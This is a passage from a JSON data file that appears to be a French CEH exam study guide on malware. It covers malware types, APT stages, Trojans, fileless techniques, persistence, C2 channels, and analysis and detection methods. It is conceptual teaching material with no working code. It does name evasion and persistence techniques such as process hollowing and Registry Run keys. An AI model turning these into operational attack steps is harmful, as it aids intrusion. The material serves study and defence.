système afin de voler des données, espionner, frauder ou utiliser la machine compromise pour d’autres attaques. Le mot décrit une famille très large : virus, worms, Trojans, ransomware, spyware, botnets, rootkits, backdoors, crypters, etc.","cheat":[{"words":1,"title":"Objectifs typiques","rows":[["Vol","identifiants, données personnelles, financières ou professionnelles"],["Espionnage","activité utilisateur, captures d’écran, navigation"],["Contrôle","accès distant, botnet, rebond vers d’autres systèmes"],["Sabotage","suppression de données, dégradation, indisponibilité"],["Fraude","spam, extorsion, détournement de comptes"]]}],"exam":"Malware = terme générique. Virus, worm, Trojan ou ransomware sont des types de malware, pas des synonymes."},{"name":"Voies d’entrée d’un malware","desc":"Un malware peut arriver par messagerie, périphérique amovible ou fonctionnalité d’exécution automatique. Le point commun est qu’un fichier ou contenu contrôlé par l’attaquant atteint la victime puis est exécuté, ouvert ou interprété.","cheat":[{"words":1,"title":"Vecteurs cités","rows":[["Messagerie instantanée","Messenger, WhatsApp, LinkedIn… même un message venant d’un contact peut être compromis"],["USB / médias amovibles","clé USB, carte mémoire, disque externe"],["Autorun / Autoplay","un support amovible peut déclencher automatiquement du contenu si la fonctionnalité est autorisée"]]}]},{"name":"Autorun.inf","desc":"Autorun/Autoplay est une fonctionnalité Windows qui peut lancer automatiquement un programme présent sur un support amovible. Un fichier Autorun.inf peut indiquer quel exécutable ouvrir. Pour réduire le risque, le cours recommande de désactiver Autoplay sur les postes.","syntax":"[autorun]\nopen=setup.exe\nicon=setup.exe","exam":"Contre-mesure : gpedit.msc → Computer Configuration → Administrative Templates → Windows Components → Autoplay Policies → Turn off Autoplay."},{"name":"Distribution web de malware","desc":"Les attaquants utilisent le Web pour amener l’utilisateur sur un contenu malveillant, faire exécuter un fichier ou exploiter directement le navigateur. Certaines techniques reposent sur la tromperie, d’autres sur une compromission invisible du site ou de la publicité.","cheat":[{"words":1,"title":"Techniques","rows":[["Black Hat SEO","faire remonter artificiellement des pages malveillantes dans les résultats"],["Click-jacking social","faire cliquer la victime sur un élément trompeur"],["Spear-phishing sites","imiter un site légitime pour voler des informations"],["Malvertising","publicité contenant ou menant vers du code malveillant"],["Compromised website","site légitime compromis qui infecte ses visiteurs"],["Drive-by download","infection déclenchée par la visite d’un site exploitant le navigateur"],["Spam email","pièce jointe ou lien malveillant envoyé en masse"],["RTF injection","document RTF qui récupère du contenu ou des macros distants à l’ouverture"]]}]},{"name":"Composants d’un malware","desc":"Un malware est souvent composé de plusieurs briques ayant des rôles différents : dissimuler le code, le transporter, l’installer, l’injecter dans un processus ou exécuter l’action finale. Comprendre ces termes évite de confondre la méthode de livraison avec le payload.","cheat":[{"words":1,"title":"Composants CEH","rows":[["Crypter","cache l’existence du malware et aide à éviter la détection"],["Downloader","récupère d’autres malwares ou du code depuis Internet"],["Dropper","embarque le payload et l’installe discrètement sur le système"],["Exploit","exploite une vulnérabilité pour obtenir un comportement non prévu"],["Injector","injecte du code dans un autre processus"],["Obfuscator","rend le code difficile à lire/analyser"],["Packer","compresse ou encapsule le binaire sous une forme peu lisible"],["Payload","partie qui réalise réellement l’action malveillante"],["Malicious code","code qui implémente la fonctionnalité malveillante"]]}],"exam":"Dropper ≠ Downloader : dropper transporte/installe le payload ; downloader va le chercher sur Internet."},{"name":"PUA / PUP / Grayware","desc":"Une Potentially Unwanted Application est une application parfois distribuée avec un logiciel légitime ou via un installateur trompeur. Elle n’est pas toujours classée comme malware classique, mais peut modifier les réglages, surveiller l’utilisateur, afficher de la publicité ou créer un risque de sécurité et de confidentialité.","exam":"Synonymes fréquents : PUA, PUP, grayware, junkware."}]},{"g":"Types de malware","items":[{"name":"Virus","desc":"Un virus se réplique en s’attachant à un fichier, un programme, un secteur de boot ou un document. Il a besoin qu’un utilisateur ou un mécanisme exécute le contenu infecté pour poursuivre l’infection. Une fois actif, il peut injecter son code dans d’autres programmes et continuer à se propager.","exam":"Virus = dépend d’un hôte/fichier et d’une exécution. Worm = propagation autonome."},{"name":"Worm","desc":"Un worm se propage de lui-même après son lancement initial. Il recherche des systèmes vulnérables sur le réseau, exploite la faiblesse puis copie sa propre charge vers les nouvelles machines. Même sans payload destructeur, sa réplication peut saturer CPU, mémoire et bande passante.","exam":"Worm = self-propagation. Il n’a pas besoin de se rattacher à un fichier hôte."},{"name":"Trojan","desc":"Un Trojan se présente comme quelque chose de légitime ou utile afin que l’utilisateur l’exécute. Sa caractéristique principale est la tromperie, pas l’auto-réplication. Une fois lancé, il agit avec les privilèges de la victime et peut installer une backdoor, voler des données ou donner un contrôle distant.","exam":"Trojan = apparence légitime + fonctionnalité cachée. Il ne se définit pas par la réplication."},{"name":"Botnet","desc":"Un botnet est l’ensemble des machines compromises contrôlées par le même attaquant ou la même famille de malware. Chaque endpoint exécute un bot/client qui reçoit des ordres d’une infrastructure C2. Les botnets modernes peuvent être centralisés ou pair-à-pair pour éviter un point unique de coupure.","cheat":[{"words":1,"title":"À retenir","rows":[["Bot","machine ou agent infecté"],["Botnet","ensemble de bots contrôlés"],["C2","infrastructure utilisée pour envoyer les commandes"]]}]},{"name":"Ransomware","desc":"Un ransomware chiffre une partie ou la totalité des données puis exige un paiement, souvent en cryptomonnaie, en échange d’une clé de déchiffrement. Les campagnes modernes peuvent d’abord voler les données puis menacer de les publier : c’est la double extorsion.","flow":"Infection → chiffrement → demande de rançon → éventuelle clé de déchiffrement","cheat":[{"words":1,"title":"Évolution moderne","rows":[["Staged ransomware","l’attaquant attend d’avoir compromis beaucoup d’actifs avant de déclencher le chiffrement"],["Double extortion","chiffrement + exfiltration + menace de publication"],["WannaCry","ransomware ET worm, propagé notamment via EternalBlue"],["Familles citées","Ryuk, Maze, REvil"]]}]},{"name":"Backdoor","desc":"Une backdoor crée ou conserve un moyen d’accès qui contourne le chemin normal d’authentification. Elle sert surtout à revenir sur la machine compromise sans devoir exploiter à nouveau la vulnérabilité initiale."},{"name":"Rootkit","desc":"Un rootkit cherche à fournir ou conserver un accès privilégié tout en masquant la présence de l’attaquant ou du malware. Il peut modifier le système, les fonctions de l’OS ou les données affichées aux outils de sécurité."},{"name":"Spyware","desc":"Un spyware surveille l’utilisateur sans consentement et transmet des informations à un tiers : activité de navigation, frappes clavier, captures d’écran, données personnelles, etc."},{"name":"Adware","desc":"Un adware affiche de la publicité intrusive ou modifie le comportement du navigateur. Il peut être fourni avec un logiciel légitime et est souvent classé comme PUA/PUP plutôt que comme malware destructeur."},{"name":"Dropper","desc":"Un dropper sert de transport et d’installateur. Il contient ou encapsule le payload, l’extrait puis le dépose sur le système de manière discrète. L’intérêt est de séparer le premier artefact visible du malware final."},{"name":"Downloader","desc":"Un downloader est une première charge légère dont le rôle principal est de contacter Internet ou une infrastructure C2 pour télécharger un second payload. Contrairement au dropper, le payload final n’a pas besoin d’être déjà embarqué dans le fichier initial."},{"name":"Polymorphic malware","desc":"Un malware polymorphe modifie son apparence à chaque copie ou infection afin de produire des signatures et hashes différents tout en conservant le même comportement. Il peut changer son déchiffreur ou son encodage pour contourner les antivirus fondés sur les signatures.","exam":"Polymorphisme → forme/hash change, comportement reste équivalent ; la détection comportementale devient importante."}]},{"g":"APT — Advanced Persistent Threat","items":[{"name":"APT — définition","desc":"Une Advanced Persistent Threat est une intrusion ciblée dans laquelle l’attaquant obtient un accès non autorisé et cherche à rester discret pendant une longue période. L’objectif principal présenté dans le module est l’obtention durable d’informations sensibles plutôt que le sabotage immédiat.","cheat":[{"words":1,"title":"Le nom APT","rows":[["Advanced","techniques et ressources capables d’exploiter des vulnérabilités et d’éviter la détection"],["Persistent","accès conservé dans le temps et communication continue avec l’extérieur"],["Threat","opération coordonnée avec une implication humaine"]]}],"exam":"APT : priorité à l’espionnage / collecte durable d’informations sensibles."},{"name":"Caractéristiques d’une APT","desc":"Une APT se distingue par un objectif clair, du temps, des ressources, une tolérance au risque maîtrisée et des techniques destinées à rester discrètes. L’attaquant peut combiner social engineering, exploitation, mouvement interne et maintien d’accès.","cheat":[{"words":1,"title":"5 axes","rows":[["Objectives","ce que l’attaquant cherche à obtenir"],["Timeliness","temps investi entre découverte et exploitation"],["Resources","personnes, outils et techniques disponibles"],["Risk tolerance","niveau de risque de détection accepté"],["Skills & methods","capacité à contourner la détection et rester longtemps"]]}]},{"name":"Cycle de vie APT — 6 étapes","desc":"Le cycle décrit une intrusion longue qui commence par la préparation, obtient un premier accès, s’étend dans l’environnement, maintient la présence puis recherche et exfiltre les données avant de nettoyer ses traces. La boucle peut recommencer pour conserver l’accès.","flow":"Preparation → Initial Intrusion → Expansion → Persistence → Search & Exfiltration → Cleanup","cheat":[{"words":1,"title":"Les 6 étapes","rows":[["1. Preparation","choisir la cible, faire les recherches, préparer équipe et outils"],["2. Initial Intrusion","déployer le malware et établir une connexion sortante"],["3. Expansion","étendre l’accès et récupérer davantage d’identifiants"],["4. Persistence","maintenir la présence dans le temps"],["5. Search & Exfiltration","chercher puis extraire les données visées"],["6. Cleanup","effacer ou réduire les traces tout en restant discret"]]}],"exam":"Ordre à mémoriser : Preparation → Initial Intrusion → Expansion → Persistence → Search/Exfiltration → Cleanup."}]},{"g":"Trojans","items":[{"name":"Indications d’un Trojan","desc":"Un Trojan peut provoquer des signes visibles lorsque sa charge agit sur l’interface ou désactive des protections : écran qui clignote, fond d’écran modifié, souris qui bouge, fenêtres de chat inattendues, antivirus désactivé, impression ou lecteur optique déclenché sans action, trafic réseau inhabituel. Ces signes ne sont pas une preuve unique, mais des indices de compromission."},{"name":"14 catégories de Trojans","desc":"Le module CEH classe les Trojans selon la fonction qu’ils réalisent après exécution. L’idée à retenir n’est pas seulement le nom : chaque type décrit l’objectif principal de la charge.","cheat":[{"words":1,"title":"Types","rows":[["Remote Access Trojan (RAT)","contrôle distant complet : fichiers, écran, caméra, keylogging"],["Backdoor Trojan","ouvre un accès persistant et un canal C2"],["Botnet Trojan","enrôle la machine dans un botnet"],["Rootkit Trojan","fournit accès privilégié et dissimulation"],["E-Banking Trojan","vole ou détourne les opérations bancaires"],["POS Trojan","cible les terminaux de paiement"],["Defacement Trojan","modifie l’apparence d’un site"],["Service Protocol Trojan","abuse ou imite un protocole de service"],["Mobile Trojan","cible smartphones/tablettes"],["IoT Trojan","cible objets connectés"],["Security Software Disabler","désactive antivirus/EDR/pare-feu"],["Destructive Trojan","détruit ou altère des données"],["DDoS Trojan","utilise la machine pour participer à un DDoS"],["Command Shell Trojan","fournit un shell distant"]]}],"exam":"La liste des 14 types est explicitement mise en avant dans le module."},{"name":"E-Banking Trojan — TAN Grabber","desc":"Le TAN Grabber intercepte un Transaction Authentication Number valide envoyé par l’utilisateur. Il remplace le TAN présenté à la banque par une valeur incorrecte afin que la transaction légitime échoue, puis l’attaquant conserve le TAN valide pour une opération frauduleuse."},{"name":"E-Banking Trojan — HTML Injection","desc":"L’attaque modifie dynamiquement la page bancaire affichée dans le navigateur et ajoute de faux champs. L’utilisateur croit remplir le vrai formulaire du site alors que des données supplémentaires sont envoyées à l’attaquant."},{"name":"E-Banking Trojan — Form Grabber","desc":"Le Form Grabber capture les données saisies dans les formulaires web avant ou au moment de leur envoi. Il vise particulièrement les identifiants et informations financières transmis par le navigateur."},{"name":"E-Banking Trojan — Covert Credential Grabber","desc":"Le malware reste discret jusqu’à ce qu’il détecte une transaction bancaire ou une activité ciblée, puis récupère les identifiants de manière furtive."},{"name":"Crypter dans le déploiement d’un Trojan","desc":"Un crypter transforme ou chiffre le binaire original afin de masquer sa signature et rendre son analyse plus difficile. Il sert surtout à réduire la détection par les antivirus fondés sur des signatures."},{"name":"Propagation d’un Trojan","desc":"Les vecteurs cités comprennent l’e-mail, les canaux discrets, les serveurs proxy et les supports USB. Le Trojan a besoin d’un mécanisme qui amène l’utilisateur ou le système à exécuter la charge."}]},{"g":"Virus & worms","items":[{"name":"Virus — cycle comportemental","desc":"Un virus peut rester inactif, être déclenché par une action ou une condition, se propager en infectant d’autres fichiers puis exécuter son payload. Ce découpage aide à comprendre le comportement du code une fois présent sur la machine.","flow":"Dormant → Triggering → Propagation → Execution","exam":"À côté du cycle CEH Design/Replication/Launch…, retiens aussi Dormant → Triggering → Propagation → Execution."},{"name":"Virus — cycle CEH","desc":"Le module décrit également le cycle d’un virus comme une succession de création, réplication, lancement puis phases de détection, incorporation et exécution. C’est un autre angle de mémorisation centré sur la vie complète du virus.","flow":"Design → Replication → Launch → Detection → Incorporation → Execution"},{"name":"Virus — infection vs attack phase","desc":"Pendant l’Infection Phase, le virus entre en mémoire, recherche des cibles exécutables et y ajoute son code. Pendant l’Attack Phase, le payload réalise l’action prévue : corruption, suppression, modification de données ou tout autre comportement programmé."},{"name":"Memory-resident vs non-resident","desc":"Un virus memory-resident reste chargé en mémoire après l’infection et peut continuer à agir sans relancer le fichier original. Un non-resident doit être exécuté à nouveau ; un macro virus exécuté depuis un document est l’exemple donné."},{"name":"23 types de virus","desc":"La classification CEH distingue de nombreux virus selon l’endroit infecté, la manière de se cacher ou de muter, et la condition de déclenchement.","cheat":[{"words":1,"title":"1–12","rows":[["Boot Sector","cible MBR / secteur de démarrage"],["File Virus","infecte exécutables, scripts ou fichiers applicatifs"],["Multipartite","infecte à la fois boot sector et fichiers"],["Macro","infecte des documents utilisant des macros"],["Cluster","modifie la manière dont des fichiers sont référencés dans le stockage"],["Stealth / Tunneling","intercepte les requêtes pour masquer sa présence"],["Encryption Virus","chiffre son propre code avec des clés variables"],["Sparse Infector","n’infecte que certaines exécutions ou dates pour rester discret"],["Polymorphic","change sa forme à chaque réplication"],["Metamorphic","réécrit complètement son code à chaque itération"],["Overwriting / Cavity","écrase ou se place dans des espaces du fichier"],["Companion / Camouflage","crée un fichier compagnon lancé à la place du légitime"]]},{"words":1,"title":"13–23","rows":[["Shell Virus","encapsule le programme hôte"],["File Extension Virus","abuse des extensions pour tromper l’utilisateur"],["FAT Virus","cible la File Allocation Table"],["Logic Bomb","se déclenche à une date/condition"],["Web Scripting","utilise du script web"],["Email Virus","se propage via e-mail"],["Armored Virus","emploie des techniques pour résister à l’analyse"],["Add-on Virus","ajoute son code au fichier"],["Intrusive Virus","écrase une partie du fichier hôte"],["Direct Action / Transient","agit puis quitte sans rester en mémoire"],["TSR","Terminate and Stay Resident : reste en mémoire après exécution"]]}],"exam":"Polymorphic = change sa forme ; Metamorphic = réécrit son code beaucoup plus profondément."},{"name":"Virus vs Worm","desc":"Le virus a besoin d’un hôte et d’une exécution pour se propager ; le worm exploite directement des systèmes vulnérables et se propage automatiquement. Le worm peut saturer réseau et ressources beaucoup plus rapidement.","cheat":[{"words":1,"title":"Comparaison","rows":[["Hôte","Virus : s’attache à un fichier/programme ; Worm : pas nécessaire"],["Propagation","Virus : dépend de l’exécution/copie ; Worm : automatique"],["Vecteur","Virus : fichier, document, média ; Worm : vulnérabilité réseau/application"],["Effet fréquent","Virus : altère fichiers/comportement ; Worm : consommation CPU/mémoire/bande passante"],["Vitesse","Worm généralement beaucoup plus rapide"]]}],"exam":"Worm = self-propagating ; virus = besoin d’un fichier/host et souvent d’une action utilisateur."},{"name":"Propagation d’un worm — 6 étapes","desc":"Le worm est d’abord créé et livré à une première victime. Une fois exécuté, il cherche d’autres systèmes vulnérables, s’y copie de manière autonome puis peut installer une backdoor, modifier des paramètres ou exfiltrer des données.","flow":"Create → Deliver → Execute → Scan network → Copy to vulnerable hosts → Backdoor/alter/exfiltrate"},{"name":"Worms notables","desc":"Code Red et Nimda sont cités comme exemples de worms destructeurs. Welchia/Nachi est un exemple particulier de worm présenté comme 'helpful' parce qu’il supprimait d’autres worms, mais il causait tout de même de la consommation de ressources et restait une propagation non autorisée."}]},{"g":"Fileless malware","items":[{"name":"Fileless malware — définition","desc":"Un fileless malware exécute principalement son code en mémoire et abuse de logiciels, protocoles ou outils déjà présents sur la machine. Il réduit ainsi les artefacts classiques sur disque et peut contourner une détection reposant uniquement sur les signatures de fichiers.","exam":"Fileless ≠ absolument aucun artefact : la persistance peut utiliser Registry, WMI ou Scheduled Tasks. L’idée centrale est l’exécution principalement en mémoire / LOL."},{"name":"Pourquoi le fileless est difficile à détecter","desc":"Il utilise des outils de confiance déjà installés et peut injecter du code dans des processus légitimes. Comme il n’apporte pas nécessairement un exécutable malveillant identifiable sur disque, l’analyse doit davantage surveiller le comportement, les scripts, la mémoire et les processus."},{"name":"Fileless — 4 phases","desc":"Le cycle CEH part d’un point d’entrée, exécute le code dans un processus ou via un outil légitime, crée éventuellement une persistance puis réalise l’objectif : reconnaissance, vol d’identifiants, exfiltration ou espionnage.","flow":"Point of Entry → Code Execution → Persistence → Achieving Objectives","cheat":[{"words":1,"title":"Exemples par phase","rows":[["Point of Entry","memory exploit, site malveillant, phishing, document malveillant"],["Code Execution","process hollowing, reflective DLL injection, PowerShell, CScript, VBScript"],["Persistence","Registry, WMI, Scheduled Task"],["Objectives","reconnaissance, credential harvesting, exfiltration, espionnage"]]}],"exam":"4 phases à mémoriser dans cet ordre."},{"name":"Memory code injection","desc":"La charge malveillante est injectée directement dans la mémoire d’un processus. Le cours cite notamment local shellcode injection, remote thread injection et process hollowing. Cela aide à éviter un fichier exécutable malveillant visible sur disque."},{"name":"Reflective DLL Injection","desc":"Une DLL est chargée directement dans la mémoire d’un processus sans passer par l’installation classique ni écrire la DLL sur le disque. Le but est d’exécuter du code dans un processus existant avec moins d’artefacts."},{"name":"Script-based injection","desc":"Du code, du shellcode ou des binaires encodés sont inclus dans des scripts. Ils peuvent être transmis par e-mail ou via un document et lancés par un interpréteur déjà présent. Cette technique peut être partiellement fileless même si le script d’origine est un fichier."},{"name":"Process Hollowing","desc":"Un processus légitime est créé puis son contenu mémoire est remplacé ou détourné par du code malveillant. Le processus visible conserve un nom attendu alors que son comportement est contrôlé par la charge injectée."},{"name":"Living off the Land dans le fileless","desc":"Le malware utilise des outils d’administration légitimes déjà présents sur le système. Les exemples cités comprennent PowerShell, WMIC, Certutil, Regsvr32 et rundll32. Cela réduit le besoin de déposer de nouveaux binaires et complique la distinction entre administration et attaque."},{"name":"Persistance fileless","desc":"Comme la RAM est volatile, un malware uniquement en mémoire disparaît au redémarrage. Pour survivre, il peut stocker une commande ou un script dans le Registry, créer une WMI Event Subscription ou une Scheduled Task qui relancera le code."}]},{"g":"AI-based malware","items":[{"name":"AI-based malware — définition","desc":"Le module décrit les malwares basés sur l’IA comme des logiciels malveillants utilisant des algorithmes d’IA pour automatiser certaines décisions, adapter leur comportement, améliorer la furtivité ou accélérer l’infection et l’exécution."},{"name":"Cycle AI malware — 7 phases","desc":"L’infection commence par l’entrée sur la cible, établit un foothold, collecte des informations sur l’environnement, adapte sa stratégie, exécute son action, se propage puis continue d’évoluer face aux changements de la cible.","flow":"Infiltration → Establishment → Learning → Adaptation → Execution → Propagation → Evolution","exam":"7 phases CEH v13 : Infiltration, Establishment, Learning, Adaptation, Execution, Propagation, Evolution."},{"name":"Capacités attribuées à l’AI malware","desc":"Le cours met l’accent sur l’adaptation : personnaliser du social engineering à partir de données publiques, modifier des stratégies pour contourner les défenses, compliquer l’attribution, rester dormant, coordonner plusieurs vecteurs ou se reconfigurer lorsqu’une partie de l’attaque est bloquée."},{"name":"Variantes citées","desc":"Les noms cités dans le module pour illustrer l’AI-based malware incluent BlackMamba, WormGPT, FraudGPT, Stuxnet, DeepLocker et Mylobott. Pour la révision, l’important est de reconnaître ces noms comme exemples associés à la partie IA du CEH v13."},{"name":"AI, polymorphisme et social engineering","desc":"Le chapitre insiste aussi sur le fait que l’IA facilite la génération et l’obfuscation de code ainsi que la personnalisation de campagnes de phishing à grande échelle. Elle peut donc renforcer à la fois le malware lui-même et son mécanisme de livraison."},{"name":"Agentic malware","desc":"Le chapitre évoque des malwares plus autonomes capables d’utiliser un modèle embarqué pour choisir leurs prochaines actions en fonction du contexte : sélectionner les fichiers les plus intéressants ou générer de nouveaux leurres depuis l’environnement compromis."}]},{"g":"Malware analysis — environnement & méthode","items":[{"name":"Malware analysis — 3 étapes","desc":"L’analyse suit trois grandes étapes : préparer un environnement sûr, étudier l’échantillon sans l’exécuter, puis observer son comportement lors d’une exécution contrôlée. La combinaison statique + dynamique est nécessaire car certaines informations n’apparaissent qu’à l’exécution.","flow":"Prepare Testbed → Static Analysis → Dynamic Analysis","exam":"Les 3 étapes principales sont explicitement testables."},{"name":"Préparer le testbed — 9 étapes","desc":"Un laboratoire d’analyse doit empêcher le malware d’atteindre le réseau réel et permettre un retour rapide à un état propre.","cheat":[{"words":1,"title":"Étapes","rows":[["1","réserver une machine physique pour le lab"],["2","installer un hyperviseur / VM"],["3","installer le ou les OS invités"],["4","isoler le réseau, par exemple en host-only"],["5","simuler les services Internet avec INetSim"],["6","désactiver shared folders et guest isolation"],["7","installer les outils d’analyse"],["8","générer un hash de l’OS et des outils pour disposer d’une référence"],["9","copier l’échantillon dans la VM"]]}]},{"name":"Static Analysis","desc":"L’analyse statique étudie un échantillon sans l’exécuter. Elle inspecte les propriétés du fichier, les chaînes, le format PE/ELF/Mach-O, les dépendances, les imports/exports, le code désassemblé et les signes de packing ou d’obfuscation.","exam":"Static = ne pas lancer le malware ; Dynamic = l’exécuter dans un environnement contrôlé."},{"name":"10 techniques d’analyse statique","desc":"Le module regroupe les techniques statiques à connaître : empreinte du fichier, scan local/online, recherche de chaînes, détection du packing/obfuscation, informations PE, dépendances, disassembly, analyse ELF, Mach-O et documents Office malveillants.","cheat":[{"words":1,"title":"Liste","rows":[["1","File fingerprinting"],["2","Local / online malware scanning"],["3","String search"],["4","Packing / obfuscation identification"],["5","PE information"],["6","File dependencies"],["7","Disassembly"],["8","ELF analysis"],["9","Mach-O analysis"],["10","Malicious MS Office document analysis"]]}]},{"name":"Dynamic Analysis","desc":"L’analyse dynamique exécute le malware dans une VM ou sandbox instrumentée puis observe les changements qu’il provoque : fichiers, Registry, processus, services, ports, requêtes DNS, connexions réseau, API calls, scheduled tasks et autres traces runtime.","exam":"Dynamic analysis = comportement réel, mais risque d’évasion si le malware détecte la VM."},{"name":"System Baselining","desc":"Avant l’exécution, on capture l’état initial du système : fichiers, Registry, processus, ports, services et trafic. Cette baseline sert de référence pour distinguer ce que le malware a réellement modifié."},{"name":"Host Integrity Monitoring","desc":"Après l’exécution, on compare l’état du système à la baseline. On surveille fichiers, processus, drivers, Registry, réseau, DNS, services, startup programs, API/system calls, event logs, installations, scheduled tasks et activité navigateur."},{"name":"PE — Portable Executable","desc":"PE est le format exécutable Windows utilisé par les .exe et DLL. Il contient le code et les métadonnées dont le loader a besoin pour charger le programme en mémoire. Les sections typiques incluent .text pour le code exécutable et .data pour les données initialisées."},{"name":"ELF et Mach-O","desc":"ELF est un format exécutable courant sur Linux/Unix ; Mach-O est utilisé sur macOS. L’analyse statique doit tenir compte du format correspondant au système cible et des structures propres à ce format."},{"name":"Packer / stub","desc":"Un packer compresse ou chiffre le vrai payload et ne laisse qu’un petit stub visible. Au lancement, le stub décompresse/déchiffre la charge puis lui transfère l’exécution. Cela masque une partie du code tant que le programme n’est pas exécuté."},{"name":"Disassembly","desc":"Le désassemblage transforme les opcodes machine en instructions assembleur lisibles. L’analyste peut alors suivre les fonctions, appels et branches du programme même sans code source."},{"name":"Assembly — repères de base","desc":"Quelques notions suffisent pour lire un désassemblage : les registres stockent des opérandes très rapidement ; ESI représente une source, EDI une destination ; MOV déplace des données, LEA charge une adresse calculée, JMP change le flux d’exécution, ADD/SUB modifient une valeur et INC incrémente de 1.","cheat":[{"words":1,"title":"Instructions citées","rows":[["ESI","source index / adresse source"],["EDI","destination index / adresse destination"],["MOV","déplacer/copier une valeur"],["LEA","charger une adresse effective"],["JMP","sauter vers une autre adresse"],["ADD / SUB","addition / soustraction"],["INC","+1"],["INT 0x80","appel système Linux via interruption 128"]]}]},{"name":"Metadata & code signing","desc":"Les métadonnées peuvent révéler dates de création/modification, produit, copyright ou éditeur. Une signature cryptographique peut confirmer l’éditeur d’un binaire. Un fichier prétendant être légitime mais non signé ou signé par un éditeur inattendu mérite une investigation supplémentaire."},{"name":"VM detection","desc":"Certains malwares cherchent des indices de virtualisation — préfixe MAC VMware, drivers spécifiques, structures mémoire — puis restent inactifs pour paraître bénins. Une analyse dynamique qui ne montre rien ne prouve donc pas automatiquement que l’échantillon est sûr."},{"name":"Code emulation","desc":"L’émulation exécute ou simule le code dans un environnement virtuel reproduisant processeur, mémoire, disque, réseau et fonctions système. Elle permet notamment d’observer des malwares chiffrés ou polymorphes sans dépendre du poste réel. Elle peut toutefois être lente si le malware utilise une longue boucle de déchiffrement."}]},{"g":"Détection malware","items":[{"name":"5 méthodes de détection","desc":"Le module distingue cinq grandes méthodes : signatures, vérification d’intégrité, interception des opérations sensibles, émulation du code et heuristique. Elles se complètent car aucune ne couvre parfaitement les malwares inconnus, polymorphes ou fileless.","cheat":[{"words":1,"title":"Méthodes","rows":[["Scanning","chercher une signature connue dans les fichiers"],["Integrity Checking","comparer l’état ou l’empreinte des fichiers/systèmes à une référence"],["Interception","surveiller les requêtes du système avant qu’elles ne modifient le disque ou l’OS"],["Code Emulation","exécuter/simuler le code dans un environnement virtuel"],["Heuristic Analysis","détecter un comportement ou une structure suspecte même sans signature connue"]]}],"exam":"Heuristics = utile pour variantes inconnues mais davantage de faux positifs."},{"name":"Signature-based antivirus","desc":"Un antivirus classique peut comparer le hash ou des motifs d’un fichier à une base de signatures connues. Une modification du binaire peut changer le hash ; le polymorphisme, le packing, le chiffrement et l’encodage réduisent donc l’efficacité des signatures seules."},{"name":"Heuristic Analysis","desc":"L’heuristique cherche des caractéristiques suspectes plutôt qu’une signature exacte. Elle peut être statique, en étudiant la structure du fichier, ou dynamique, en exécutant du code suspect dans une émulation. Elle permet de détecter de nouvelles variantes mais peut produire des faux positifs."},{"name":"Behavior-based detection / EDR","desc":"Une détection comportementale observe ce que fait réellement un processus : injection, modification du Registry, credential dumping, connexions inhabituelles, scripts ou accès à des zones sensibles. Elle est particulièrement importante pour les malwares fileless ou polymorphes."},{"name":"YARA","desc":"YARA est un langage de règles qui décrit des motifs permettant d’identifier des fichiers ou familles de malware. Une règle contient généralement des métadonnées, des chaînes ou séquences hexadécimales et une condition définissant quand la règle correspond.","syntax":"yara <rulefile.yar> <suspicious_file>"},{"name":"MITRE MBC","desc":"Le Malware Behavior Catalog est un catalogue MITRE focalisé sur les comportements de malware. Des outils comme capa peuvent mapper les capacités observées d’un binaire vers MBC pour décrire ce que le malware sait faire sans se limiter à un nom de famille."}]},{"g":"C2 & persistance","items":[{"name":"Command and Control — C2","desc":"Le C2 est l’infrastructure permettant à l’attaquant d’envoyer des commandes aux machines infectées et de recevoir leurs résultats. Un bot ou agent contacte le C2, récupère des instructions et renvoie éventuellement des données ou un statut."},{"name":"Canaux C2","desc":"Les malwares peuvent utiliser des protocoles très courants pour se fondre dans le trafic. HTTP/HTTPS se mélange à la navigation web, DNS peut transporter des commandes dans les requêtes/réponses, SMB peut servir de canal interne, IRC est historique et le P2P supprime le serveur central unique.","cheat":[{"words":1,"title":"Canaux","rows":[["IRC","canal ancien : bots rejoignent un channel"],["HTTP/HTTPS","trafic web, ports 80/443"],["DNS","commandes/données encodées dans DNS"],["SMB","communication latérale/interne"],["P2P","modèle décentralisé sans C2 unique"]]}]},{"name":"Web-based C2","desc":"Une infrastructure C2 web expose des endpoints HTTP/HTTPS que les bots appellent pour récupérer des commandes ou renvoyer des résultats. Le chapitre cite Node.js, Express et des APIs de style REST pour construire ce type de service."},{"name":"Cobalt Strike BEACON","desc":"Cobalt Strike est un outil commercial de simulation d’adversaire largement détourné par des attaquants. BEACON est son agent/payload. Il peut communiquer via HTTP, HTTPS, DNS ou SMB et utiliser des Malleable C2 Profiles pour modifier l’apparence du trafic."},{"name":"Persistance — objectif","desc":"La persistance garantit que l’accès revient après un reboot, un logout ou la mort du processus, sans devoir exploiter à nouveau la vulnérabilité initiale. Elle transforme un accès temporaire en présence durable."},{"name":"Boot-level persistence","desc":"Un bootkit ou implant firmware démarre avant que l’OS soit complètement chargé. Il peut donc entrer en mémoire avant l’antivirus ou l’EDR, ce qui rend ce type de persistance particulièrement difficile à détecter."},{"name":"Registry Run Keys","desc":"Windows peut lancer automatiquement un programme à partir de clés Registry. HKLM s’applique au système et nécessite des privilèges élevés ; HKCU s’applique uniquement à l’utilisateur courant et peut être modifié avec ses propres droits.","syntax":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"},{"name":"Scheduled Tasks / cron","desc":"Un attaquant peut planifier l’exécution périodique de son payload. Sous Windows, le cours cite schtasks/at ; sous Unix/Linux, cron. Même si le processus est arrêté, la tâche peut le relancer à l’heure prévue."},{"name":"WMI Event Subscription","desc":"WMI permet de créer une règle persistante composée d’un événement déclencheur et d’une action. L’abonnement est stocké dans le repository WMI plutôt que comme simple fichier, ce qui peut le rendre moins évident pour une analyse fondée uniquement sur le filesystem."}]}]},"outil":{"groups":[{"g":"Analyse statique","items":[{"name":"FLARE VM","desc":"Environnement Windows préconfiguré pour la rétro-ingénierie et l’analyse de malware. L’installeur FLARE de Mandiant/FireEye s’appuie sur Chocolatey pour installer un ensemble d’outils d’analyse."},{"name":"Ghidra","desc":"Suite gratuite de rétro-ingénierie développée par la NSA. Elle fournit désassemblage, fonctions, imports/exports, graphes de contrôle, scripting et prise en charge multi-architecture.","exam":"Ghidra = alternative gratuite à IDA Pro ; comprend les ABI des différentes plateformes."},{"name":"IDA Pro","desc":"Debugger et désassembleur commercial très utilisé en reverse engineering, avec prise en charge de plusieurs OS et architectures. Une Community Edition existe également."},{"name":"Cutter","desc":"Outil open-source de reverse engineering qui affiche propriétés, désassemblage et graphes du programme sans exécuter ni modifier l’échantillon."},{"name":"PEiD / PE Detective","desc":"Outils utilisés pour identifier le packer ou 